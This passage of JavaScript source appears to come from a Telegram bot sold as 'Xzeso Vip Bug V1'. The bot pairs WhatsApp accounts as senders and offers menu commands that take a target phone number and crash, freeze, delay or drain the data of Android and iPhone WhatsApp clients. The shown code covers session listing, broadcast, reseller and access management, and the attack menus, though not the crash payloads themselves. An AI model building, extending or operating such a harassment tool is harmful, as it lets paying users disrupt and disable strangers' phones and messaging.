              const socketUser = sock?.user || {};

              let phoneNumber = clientData?.phone || "Unknown";
              if (userJid && userJid.includes("@")) {
                phoneNumber = userJid.split("@")[0];
              }

              const deviceModel =
                me?.device ||
                socketUser?.device ||
                creds?.platformDisplayName ||
                "Unknown";
              const deviceName =
                me?.name || socketUser?.name || creds?.deviceModel || "Unknown";
              const platform =
                creds?.platform || socketUser?.platform || "WhatsApp";

              let waVersion = "Unknown";
              if (creds?.waVersion) {
                waVersion = Array.isArray(creds.waVersion)
                  ? creds.waVersion.join(".")
                  : creds.waVersion.toString();
              }

              let deviceId = "Unknown";
              try {
                if (creds?.signedIdentityKey?.public) {
                  const keyBuffer = Buffer.isBuffer(
                    creds.signedIdentityKey.public
                  )
                    ? creds.signedIdentityKey.public
                    : Buffer.from(creds.signedIdentityKey.public);
                  deviceId = keyBuffer
                    .toString("hex")
                    .slice(0, 16)
                    .toUpperCase();
                } else if (typeof creds?.signedIdentityKey === "string") {
                  deviceId = creds.signedIdentityKey.slice(0, 16).toUpperCase();
                } else if (creds?.me?.id) {
                  deviceId = creds.me.id
                    .split(":")[0]
                    .slice(0, 16)
                    .toUpperCase();
                }
              } catch (keyErr) {
                deviceId = "HASH_ERROR";
              }

              const lastSync = creds?.lastAccountSyncTimestamp
                ? new Date(creds.lastAccountSyncTimestamp).toLocaleString(
                    "id-ID"
                  )
                : "Never synced";

              let telegramName = "Unknown User";
              let telegramUsername = "No Username";

              try {
                const telegramData = await ctx.api
                  .getChat(uid)
                  .catch(() => null);
                if (telegramData) {
                  telegramName =
                    telegramData?.first_name ||
                    telegramData?.title ||
                    "Unknown";
                  telegramUsername = telegramData?.username
                    ? `@${telegramData.username}`
                    : "No Username";
                }
              } catch (tgErr) {}

              const connectionStatus =
                clientData?.status === "open" ? "✅ Aktif" : "❌ Offline";

              result +=
                `⚡ *SENDER LIST NO. ${count}*` +
                `────────────────────────────────────\n` +
                `👤 *Telegram : ${telegramName}*\n` +
                `🔑 *TG ID : \`${uid}\`*\n` +
                `🌐 *Username : ${telegramUsername}*\n` +
                `\n` +
                `📱 *WhatsApp : \`${phoneNumber}\`*\n` +
                `📟 *Nama Device : ${deviceName}*\n` +
                `🔧 *Tipe Device : ${deviceModel}*\n` +
                `💻 *Platform : ${platform}*\n` +
                `📦 *Versi WA : ${waVersion}*\n` +
                `🔐 *Device Hash : \`${deviceId}\`*\n` +
                `⏱️ *Last Sync : ${lastSync}*\n` +
                `🔗 *Status : ${connectionStatus}*\n` +
                `\n`;
            } catch (innerErr) {
              log.error(`[LISTPAIR] Error client ${uid}: ${innerErr.message}`);

              result +=
                `⚡ *SENDER LIST NO. ${count}*` +
                `👤 *User ID : \`${uid}\`*\n` +
                `🔗 *Status : ✅ Connected (Data partial)*\n` +
                `⚠️ *Note : Session sedang tersinkronisasi*\n\n`;
            }
          }

          if (count === 0) {
            return ctx.reply(
              "ℹ️ *Tidak Ada Sender Aktif*\n\nBelum ada WhatsApp yang terhubung. Gunakan `/reqpair` untuk menambahkan sender baru.",
              { parse_mode: "Markdown" }
            );
          }

          result += `═══════════════════════════════════\n`;
          result += `📊 *Total Sender Aktif:* ${count}\n`;
          result += `📅 *Check Time:* ${new Date().toLocaleString("id-ID")}`;

          await ctx.reply(result, { parse_mode: "Markdown" });
        } catch (e) {
          log.error(`[LISTPAIR] Critical error: ${e.message}`);
          await ctx.reply(
            "❌ *Terjadi Kesalahan*\n\nGagal membaca data sender.",
            { parse_mode: "Markdown" }
          );
        }
        break;
      }

      /**
       * oppsional mau pake ini atau clearsender
       */

      case "clearsesi": {
        try {
          let targetUserId = userId;
          if (args[0] && isOwner(userId)) {
            targetUserId = args[0];
          }

          const client = waClients[targetUserId];
          if (!client) {
            return ctx.reply(
              "⚠️ Tidak ada sesi WhatsApp aktif untuk user ini.",
              { parse_mode: "Markdown" }
            );
          }

          if (client.sock?.end) {
            await client.sock.end().catch(() => {});
          }

          delete waClients[targetUserId];

          await ctx.reply(
            `✅ Sesi WhatsApp untuk user ${targetUserId} telah dihapus.`,
            { parse_mode: "Markdown" }
          );
        } catch (err) {
          log.error(`Failed to clear session for ${userId}: ${err.message}`);
          await ctx.reply("❌ Terjadi kesalahan saat menghapus sesi.", {
            parse_mode: "Markdown",
          });
        }
        break;
      }

      case "broadcast": {
        const userId = ctx.from.id.toString();
        if (!isOwner(ctx.from.id) && !isReseller(ctx.from.id))
    return ctx.reply("❌ Hanya reseller yang bisa akses!");
        const msg = args.join(" ");
        if (!msg) {
          log.warning("Empty broadcast message");
          return ctx.reply("⚠️ Use /broadcast <pesan>");
        }
        const users = JSON.parse(
          fs.readFileSync("database/users.json", "utf8")
        );
        log.loading(
          `Broadcasting message to ${chalk.yellow(users.length)} users...`
        );
        let ok = 0,
          fail = 0;
        for (const id of users) {
          try {
            await ctx.api.sendMessage(id, msg);
            ok++;
          } catch {
            fail++;
          }
}
        log.success(
          `Broadcast completed: ${chalk.green(ok)} sent, ${chalk.red(
            fail
          )} failed`
        );
        ctx.reply(`✅ Sent: ${ok}\n❌ Failed: ${fail}`);
        break;
      }

  

        case "addacces": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId) && !isReseller(userId))
          return ctx.reply("❌ Hanya owner & reseller!");

        const target = args[0];
        if (!target) return ctx.reply("⚠️ Use /addacces <userId>");

        const access = JSON.parse(fs.readFileSync("./storage/access.json", "utf8"));
        if (access.users.includes(target))
          return ctx.reply("⚠️ User sudah memiliki access!");

        access.users.push(target);
        fs.writeFileSync("./storage/access.json", JSON.stringify(access, null, 2));

        ctx.reply(`✅ Access ditambahkan untuk ${target}`);
        break;
      }
      
      case "free": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId))
          return ctx.reply("❌ Khusus owner!");

        const settings = JSON.parse(fs.readFileSync("./database/settings.json", "utf8"));

        
       
        settings.freeMode = !settings.freeMode;
        fs.writeFileSync("./database/settings.json", JSON.stringify(settings, null, 2));

        if (settings.freeMode) {
          ctx.reply(
            "🟢 *Free Mode Active*\nAll users can now use all commands.",
            { parse_mode: "Markdown" }
          );
        } else {
          ctx.reply(
            "🔒 *Free Mode nonaktifkan*\nOnly premium users owner reseller can use the bot If you want to buy premium DM Owner @XComanderx",
            { parse_mode: "Markdown" }
          );
        }

        break;
      }

      case "delacces": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId) && !isReseller(userId))
          return ctx.reply("❌ Hanya owner & reseller!");

        const target = args[0];
        if (!target) return ctx.reply("⚠️ Use /delacces <userId>");

        let access = JSON.parse(fs.readFileSync("./storage/access.json", "utf8"));
        access.users = access.users.filter(x => x !== target);
        fs.writeFileSync("./storage/access.json", JSON.stringify(access, null, 2));

        ctx.reply(`🗑 Access user ${target} dihapus`);
        break;
      }

      case "listacces": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId) && !isReseller(userId))
          return ctx.reply("❌ Hanya owner & reseller!");

        const access = JSON.parse(fs.readFileSync("./storage/access.json", "utf8"));
        if (access.users.length < 1)
          return ctx.reply("📭 List access kosong");

        ctx.reply(
          `📌 List Access:\n${access.users.map(x => `• ${x}`).join("\n")}`
        );
        break;
      }

      case "address": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId))
          return ctx.reply("❌ Khusus owner!");

        const target = args[0];
        if (!target) return ctx.reply("⚠️ Use /addres <userId>");

        addReseller(target);
        ctx.reply(`🟢 Reseller ditambahkan: ${target}`);
        break;
      }

      case "delress": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId))
          return ctx.reply("❌ Khusus owner!");

        const target = args[0];
        if (!target) return ctx.reply("⚠️ Use /delres <userId>");

        removeReseller(target);
        ctx.reply(`🔴 Reseller dihapus: ${target}`);
        break;
      }

      case "listress": {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId))
          return ctx.reply("❌ Khusus owner!");

        const db = JSON.parse(fs.readFileSync("./storage/resellers.json", "utf8"));
        if (db.users.length < 1)
          return ctx.reply("📭 List reseller kosong");

        ctx.reply(
          `📌 List Reseller:\n${db.users.map(x => `• ${x}`).join("\n")}`
        );
        break;
      }

      default:
        log.warning(`Unknown command: ${command}`);
    }
  } catch (err) {
    log.error(`An Error Occurred: ${err.message}`);
    try {
      await bot.api.sendMessage(
        config.ownerId,
        `An error occurred: ${err.message}`,
        {
          parse_mode: "Markdown",
        }
      );
    } catch {}
  }
});

bot.callbackQuery("open_allaccess", async (ctx) => {
  try {
    await ctx.answerCallbackQuery();

    const userDisplay = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name;
      const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(
      2
    );

    const caption = `
<blockquote>
<b><i>{❓} Xinsoo say hello ${userDisplay}</i></b>

<b>「  Xzeso Vip Bug V1 ☇ 」</b>
••► Owner: @XComanderx
••► Run Time: ${uptime}
••► Memory: ${usedMemory}
••► InterFace: Button Type
••► Type: ( Plugin )

<b> All Accsess Menu</b>
- clearsesi
- reqpair
- broadcast
- checkbio
- listpair
- addacces
- address
- delacces
- listaccess
- cdon
- cdoff
- setcd

📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @XComanderx for assistance
</blockquote>
`.trim();

    const keyboard = new InlineKeyboard()
  .text("𝘽𝙐𝙂 𝘿𝙀𝙇𝘼𝙔", "bug_spam")
  .text("🎭 forceclose", "bug_crash")
  .row()
  .text("🔥 bàck-máin", "back_to_main");

    const imageMenu = config.thumburl;

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: imageMenu,
        caption,
        parse_mode: "Markdown",
      },
      { reply_markup: keyboard }
    );
  } catch (error) {
    log.error(`Error in open_allmenu: ${error.message}`);
    await ctx
      .answerCallbackQuery({ text: "❌ Error terjadi", show_alert: true })
      .catch(() => {});
  }
});

bot.callbackQuery("open_allmenu", async (ctx) => {
  try {
    await ctx.answerCallbackQuery();

    const userDisplay = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name;
     const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(
      2
    );

    const caption = `
<blockquote>
<b><i>{❓} Xinsoo say hello ${userDisplay}</i></b>

<b>「 Xzeso Vip Bug V1  ☇ 」</b>
••► Owner: @XComanderx
••► Run Time: ${uptime}
••► Memory: ${usedMemory}
••► InterFace: Button Type
••► Type: ( Plugin )

You've successfully connected to the official bot of <b>adji pgstu</b>
Explore the tools and commands below. 🔥 Choose one of the menus below to begin your journey.

📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @XComanderx for assistance
</blockquote>`.trim();

    const keyboard = new InlineKeyboard()
  .text("BUG DELAY", "bug_spam")
  .text("BUG FORCE CLOSE", "bug_crash")
  .row()
  .text("🔥 bàck-máin", "back_to_main");

    const imageMenu = config.thumburl;

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: imageMenu,
        caption,
        parse_mode: "HTML",
      },
      { reply_markup: keyboard }
    );
  } catch (error) {
    log.error(`Error in open_allmenu: ${error.message}`);
    await ctx
      .answerCallbackQuery({ text: "❌ Error terjadi", show_alert: true })
      .catch(() => {});
  }
});

bot.callbackQuery("bug_crash", async (ctx) => {
  try {
    const userDisplay = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(
      2
    );
    await ctx.answerCallbackQuery();
    
    const caption = `<blockquote>
<b><i>{❓} Xinsoo say hello ${userDisplay}</i></b>

<b>「  Xzeso Vip Bug V1 ☇」</b>
••► Owner: @XComanderx
••► Run Time: ${uptime}
••► Memory: ${usedMemory}
••► InterFace: Button Type
••► Type: ( Plugin )

<b> Bug Crash Menu</b>

[ android blank+ui visible ]
- Uixzeso number
ᚖ example : /Uixzeso 628xxx

[ force close andro invisible ]
{ bug not work for beta }
- Xzesoandro number
ᚖ example : /Xzesoandro 628xxx

[ force close andro infinity ]
bug not work for beta
- Droidx number
ᚖ example : /Droidx 628xxx

[ force close 1 msg work beta ]
- Betaxzeso number
ᚖ example : /Betaxzeso 628xxx

[ iphone crash ]
- Xzesoiosx number
ᚖ example : /Xzesoiosx 628xxx

📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @XComanderx for assistance
</blockquote>`.trim();

    const keyboard = new InlineKeyboard().text("⬅️ Kembali", "open_allmenu");
    const imageMenu = config.thumburl;
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: imageMenu,
        caption,
        parse_mode: "HTML",
      },
      { reply_markup: keyboard }
    );
  } catch (error) {
    log.error(`Error in bug_crash: ${error.message}`);
  }
});

bot.callbackQuery("bug_spam", async (ctx) => {
  try {
    const userDisplay = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(
      2
    );
    await ctx.answerCallbackQuery();
    const caption = `<blockquote>
<b><i>{❓} Xinsoo say hello ${userDisplay}</i></b>

<b>「 Xzeso Vip Bug V1  ☇ 」</b>
••► Owner: @XComanderx
••► Run Time: ${uptime}
••► Memory: ${usedMemory}
••► InterFace: Button Type
••► Type: ( Plugin )

[ android delayed ]
- Delayxzeso number
ᚖ example : /Delayxzeso 628xxx

[ android delay beta ]
- Betaxzosex number
ᚖ example : /Betaxzosex 628xxx

[ android suck up quota ]
- Xzesox number
ᚖ example : /Xzesox 628xxx

[ android stuck message ]
- invisisendx number
ᚖ example : /invisisendx 628xxx


📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @XComanderx for assistance
</blockquote>`.trim();

    const keyboard = new InlineKeyboard().text("⬅️ Kembali", "open_allmenu");

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: new InputFile("./storage/thumbnail.jpg"),
        caption,
        parse_mode: "HTML",
      },
      { reply_markup: keyboard }
    );
  } catch (error) {
    log.error(`Error in bug_spam: ${error.message}`);
  }
});
bot.callbackQuery("back_to_main", async (ctx) => {
  try {
    await ctx.answerCallbackQuery();

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(
      2
    );

    const caption = `<blockquote>
<b><i>{❓} Xinsoo say hello ${username}</i></b>

<b>「  Xzeso Vip Bug V1 ☇ 」</b>
••► Owner: @XComanderx
••► Run Time: ${uptime}
••► Memory: ${usedMemory}
••► InterFace: Button Type
••► Type: ( Plugin )

📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @XComanderx for assistance
</blockquote>`.trim();

    const keyboard = new InlineKeyboard()
  .text("🦠 ćrashër", "open_allmenu")
  .text("🧩 aćcęss", "open_allaccess")
  .row()
  .url("👀 ćhannal", `https://t.me/${CHANNEL_ID.replace("@", "")}`);

    const imageMenu = config.thumburl;

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: imageMenu,
        caption,
        parse_mode: "HTML",
      },
      { reply_markup: keyboard }
    );
  } catch (error) {
    log.error(`Error in back_to_main: ${error.message}`);
  }
});
bot.on("callback_query", async (ctx) => {
  try {
    const data = ctx.callbackQuery.data;
    const userId = ctx.from.id.toString();

    if (data === "clearsender_confirm") {
      const processingMsg = await ctx.reply(
        "🔄 *Memulai Proses Clearing...*\n\n⏳ Menghapus semua session...",
        { parse_mode: "Markdown" }
      );

      await clearAllSessions();

      await ctx.api.editMessageText(
        userId,
        processingMsg.message_id,
        "✅ *Semua Session Dihapus!*\n\n🔄 Restarting bot dalam 2 detik...",
        { parse_mode: "Markdown" }
      );

      setTimeout(() => {
        log.warning("🔄 Bot restarting berdasarkan /clearsender command...");
        process.exit(0);
      }, 2000);
    } else if (data === "clearsender_cancel") {
      await ctx.deleteMessage();
      await ctx.reply("❌ *Pembatalan Sukses*\n\nProses clearing dibatalkan.", {
        parse_mode: "Markdown",
      });
    }

    await ctx.answerCallbackQuery();
  } catch (err) {
    log.error(`Error in callback_query: ${err.message}`);
  }
});
function formatUptime(sec) {
  const h = Math.floor(sec / 3600);
  const m = Math.floor((sec % 3600) / 60);
  const s = Math.floor(sec % 60);
  return `${h}h ${m}m ${s}s`;
}
process.on("unhandledRejection", async (reason, promise) => {
  log.error(`Unhandled Rejection: ${reason}`);
  try {
    await bot.api.sendMessage(
      config.ownerId,
      `⚠️ *Unhandled Rejection*\n\n${reason}`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch {}
});
process.on("uncaughtException", async (err) => {
  log.error(`Uncaught Exception: ${err.message}`);
  try {
    await bot.api.sendMessage(
      config.ownerId,
      `🔥 *Uncaught Exception*\n\n${err.message}`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch {}
});


/*
    * Validasi Token by Renn(T s W)
                                        */
 async function fetchValidTokens() {
  try {
    const url = `https://api.github.com/repos/adjiepangestu-ux/XINSOOGLOBAL/contents/${nama_file}`;
    const response = await axios.get(url, {
      headers: {
        Authorization: `token ${path_ghp}`,
        Accept: "application/vnd.github.v3+json"
      }
    });
    const contentBase64 = response.data.content;
    const jsonString = Buffer.from(contentBase64, "base64").toString("utf8");
    const data = JSON.parse(jsonString);
    return data.tokens || [];
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub API:", error.message));
    return [];
  }
}

async function validateToken() {
     console.log(
        chalk.blue(`Bot initialization started...`)
     );
}

process.on("uncaughtExceptionMonitor", (err, origin) => {
   log.error(`Uncaught Exception Monitor: ${err.message} | Origin: ${origin}`);
});

process.on("rejectionHandled", (promise) => {
   log.warning("A previously unhandled rejection was handled later.");
});

(async () => {
   try {
     console.clear();
     validateToken();
     log.system("Bot initialization started...");
     log.telegram("Telegram Bot with grammY is running!");
     log.success("All systems operational");
     const sessionFolders = fs.existsSync(sessionRoot)
       ? fs.readdirSync(sessionRoot)
       : [];
     if (sessionFolders.length > 0) {
       log.loading(
         `Found ${sessionFolders.length} saved WhatsApp session(s). Attempting to reconnect...`
       );
       for (const folder of sessionFolders) {
         const userId = folder;
         try {
           await initWhatsappForUser(userId, false);
           log.whatsapp(`Attempting reconnect for user ${userId}`);
         } catch (err) {
           log.error(
             `Failed to reconnect session for ${userId}: ${err.message}`
           );
         }
       }
     } else {
       log.info("No saved WhatsApp sessions found. Fresh start.");
     }    
     await bot.start();
     console.log(
       chalk.gray(`\n[${new Date().toLocaleString()}] Bot ready to serve\n`)
     );
   } catch (err) {
     log.error(`An Error Occurred: ${err.message}`);
   }
})();
